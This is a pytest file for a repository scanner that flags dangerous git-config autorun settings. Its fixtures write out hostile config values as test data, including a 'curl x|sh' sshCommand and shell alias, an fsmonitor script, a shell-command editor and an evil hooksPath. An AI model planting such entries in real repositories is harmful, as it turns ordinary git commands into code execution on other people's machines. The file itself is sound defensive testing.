"""Tests for git-config autorun detection (GitSpawn class) — src/scanner/scan.py.

A repo that ships a `.git/config` or `.gitconfig` setting core.fsmonitor (or
hooksPath / sshCommand / a `!`-shell alias) to a command turns a plain `git status`
or `clone` into remote code execution. These lock the detection + its file selection.
"""
from __future__ import annotations

from src.scanner.scan import _is_git_config_file, _scan_git_autorun, _should_skip_path


def _sev(findings, name_substr):
    for f in findings:
        if name_substr in f.name:
            return f.severity
    return None


def test_git_config_files_are_selected_and_not_skipped():
    for p in (".git/config", ".gitconfig", "gitconfig", "sub/.git/config"):
        assert _is_git_config_file(p) is True, p
        assert _should_skip_path(p) is False, p  # never skipped despite .git/ in SKIP_DIRS


def test_non_git_config_and_git_internals():
    # a plain `config` file elsewhere is NOT a git config
    assert _is_git_config_file("src/config") is False
    # other .git internals stay skipped
    assert _should_skip_path(".git/objects/ab/cdef") is True
    assert _should_skip_path(".git/HEAD") is True


def test_fsmonitor_command_is_high():
    findings = _scan_git_autorun("[core]\n\tfsmonitor = /tmp/pwn.sh\n", ".git/config")
    assert _sev(findings, "core.fsmonitor") == "high"


def test_fsmonitor_true_is_not_flagged():
    # the built-in monitor (fsmonitor=true) is legitimate — must not flag
    findings = _scan_git_autorun("[core]\n\tfsmonitor = true\n", ".git/config")
    assert findings == []


def test_hookspath_and_sshcommand_are_high():
    cfg = "[core]\n\thooksPath = ./evil\n\tsshCommand = curl x|sh\n"
    findings = _scan_git_autorun(cfg, ".git/config")
    assert _sev(findings, "core.hooksPath") == "high"
    assert _sev(findings, "core.sshCommand") == "high"


def test_editor_vim_is_benign_but_shell_editor_is_high():
    assert _scan_git_autorun("[core]\n\teditor = vim\n", ".gitconfig") == []
    assert _scan_git_autorun("[core]\n\tpager = less\n", ".gitconfig") == []
    findings = _scan_git_autorun("[core]\n\teditor = sh -c 'id'\n", ".gitconfig")
    assert _sev(findings, "core.editor") == "high"


def test_shell_alias_is_medium():
    findings = _scan_git_autorun("[alias]\n\tst = !sh -c 'curl x|sh'\n", ".gitconfig")
    assert _sev(findings, "git alias 'st'") == "medium"
    # a plain (non-!) alias is fine
    assert _scan_git_autorun("[alias]\n\tst = status\n", ".gitconfig") == []


def test_include_path_is_medium():
    findings = _scan_git_autorun('[includeIf "gitdir:~/"]\n\tpath = ~/.evil\n', ".git/config")
    assert _sev(findings, "include") == "medium"


def test_non_git_config_file_yields_nothing():
    # even with dangerous content, a non-git-config path is not parsed
    assert _scan_git_autorun("[core]\n\tfsmonitor = /tmp/x\n", "src/config") == []


def test_findings_carry_category_and_remediation():
    f = _scan_git_autorun("[core]\n\tfsmonitor = /tmp/x\n", ".git/config")[0]
    assert f.category == "git_autorun"
    assert f.remediation and "GitSpawn" in f.remediation
